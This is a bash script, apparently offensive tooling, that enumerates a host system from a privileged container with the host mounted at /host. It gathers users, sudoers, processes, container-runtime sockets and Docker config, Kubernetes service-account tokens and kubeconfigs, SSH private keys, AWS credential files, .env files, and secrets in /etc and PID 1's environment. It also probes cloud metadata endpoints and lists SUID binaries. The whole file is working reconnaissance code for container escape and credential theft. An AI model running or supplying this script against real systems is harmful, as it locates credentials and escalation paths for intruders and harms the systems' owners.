#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
cat /host/etc/os-release 2>/dev/null | grep -E "(NAME|VERSION|ID)" || echo "  Cannot read /etc/os-release"
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null || cat /host/proc/version 2>/dev/null | head -1
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null || cat /host/etc/hostname 2>/dev/null
echo ""

echo "[*] Uptime:"
cat /host/proc/uptime 2>/dev/null | awk '{printf "  Uptime: %d days, %d hours, %d minutes\n", $1/86400, ($1%86400)/3600, ($1%3600)/60}'
echo ""

echo "=== 2. NETWORK INFORMATION ==="
echo "[*] Network Interfaces:"
cat /host/proc/net/route 2>/dev/null | awk 'NR>1 {print "  Interface:", $1, "Destination:", $2, "Gateway:", $3}' | head -10
echo ""

echo "[*] ARP Table:"
cat /host/proc/net/arp 2>/dev/null | head -10
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
cat /host/proc/net/tcp 2>/dev/null | awk 'NR>1 {
    split($2, local, ":");
    split($4, remote, ":");
    port = strtonum("0x" local[2]);
    state = $4;
    if (state == "0A") print "  Port:", port, "(LISTEN)"
}' | sort -u | head -20
echo ""

echo "[*] DNS Configuration:"
cat /host/etc/resolv.conf 2>/dev/null
echo ""

echo "=== 3. USERS AND GROUPS ==="
echo "[*] Users in /etc/passwd:"
cat /host/etc/passwd 2>/dev/null | grep -v "^#" | head -20
echo ""

echo "[*] Root user details:"
grep "^root:" /host/etc/passwd 2>/dev/null
echo ""

echo "[*] Users with shell access:"
cat /host/etc/passwd 2>/dev/null | grep -E "/(bash|sh|zsh)$" | head -10
echo ""

echo "[*] Groups:"
cat /host/etc/group 2>/dev/null | head -20
echo ""

echo "[*] Sudoers:"
cat /host/etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20 || echo "  Cannot read sudoers"
echo ""

echo "=== 4. RUNNING PROCESSES ==="
echo "[*] Process count:"
cat /host/proc/stat 2>/dev/null | grep processes | awk '{print "  Total processes:", $2}'
echo ""

echo "[*] Top processes by PID (first 20):"
ls -1 /host/proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -n | head -20 | while read pid; do
    if [ -f /host/proc/$pid/cmdline ]; then
        cmd=$(cat /host/proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | cut -c1-60)
        if [ ! -z "$cmd" ]; then
            echo "  PID $pid: $cmd"
        fi
    fi
done
echo ""

echo "=== 5. INSTALLED SOFTWARE ==="
echo "[*] Checking for package managers..."
[ -f /host/usr/bin/dpkg ] && echo "  dpkg found (Debian/Ubuntu)" && chroot /host dpkg -l 2>/dev/null | head -10
[ -f /host/usr/bin/rpm ] && echo "  rpm found (RHEL/CentOS)" && chroot /host rpm -qa 2>/dev/null | head -10
[ -f /host/usr/bin/pacman ] && echo "  pacman found (Arch)" && chroot /host pacman -Q 2>/dev/null | head -10
echo ""

echo "=== 6. DOCKER/KUBERNETES ==="
echo "[*] Docker socket locations:"
find /host -name "docker.sock" 2>/dev/null
find /host -name "containerd.sock" 2>/dev/null
find /host -name "crio.sock" 2>/dev/null
echo ""

echo "[*] Docker configuration:"
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20 || echo "  No Docker config found"
echo ""

echo "[*] Kubernetes components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -5 || echo "  No kubelet directory"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -5 || echo "  No Kubernetes config"
echo ""

echo "[*] Kubernetes service account tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
echo ""

echo "[*] Kubeconfig files:"
find /host -name "kubeconfig" -o -path "*/.kube/config" 2>/dev/null | head -10
echo ""

echo "=== 7. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root .ssh directory"
find /host/home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
echo ""

echo "[*] AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
find /host -path "*/.aws/credentials" 2>/dev/null | head -5
echo ""

echo "[*] Environment files with secrets:"
find /host -name ".env" -type f 2>/dev/null | head -10
grep -r "PASSWORD\|SECRET\|API_KEY\|TOKEN" /host/etc 2>/dev/null | head -5 || echo "  (Limited search)"
echo ""

echo "=== 8. SCHEDULED TASKS ==="
echo "[*] Crontab (root):"
cat /host/var/spool/cron/crontabs/root 2>/dev/null || cat /host/etc/crontab 2>/dev/null | head -20
echo ""

echo "[*] Systemd timers:"
ls -la /host/etc/systemd/system/*.timer 2>/dev/null | head -10 || echo "  No systemd timers found"
echo ""

echo "=== 9. FILE PERMISSIONS ==="
echo "[*] SUID binaries:"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] SGID binaries:"
find /host -perm -2000 -type f 2>/dev/null | head -20
echo ""

echo "[*] World-writable directories:"
find /host/tmp -perm -002 -type d 2>/dev/null | head -10
find /host/var/tmp -perm -002 -type d 2>/dev/null | head -10
echo ""

echo "=== 10. MOUNTED FILESYSTEMS ==="
cat /host/proc/mounts 2>/dev/null | grep -v "^#" | head -20
echo ""

echo "[*] Disk usage:"
chroot /host df -h 2>/dev/null | head -10 || echo "  Cannot execute df"
echo ""

echo "=== 11. ENVIRONMENT VARIABLES ==="
echo "[*] System environment (from /proc/1/environ):"
cat /host/proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "(pass|secret|key|token|cred|api)" | head -10 || echo "  No sensitive env vars found"
echo ""

echo "=== 12. CLOUD PROVIDER METADATA ==="
echo "[*] AWS Metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || echo "  Not AWS or metadata not accessible"
echo ""

echo "[*] GCP Metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -5 || echo "  Not GCP or metadata not accessible"
echo ""

echo "[*] Azure Metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure or metadata not accessible"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
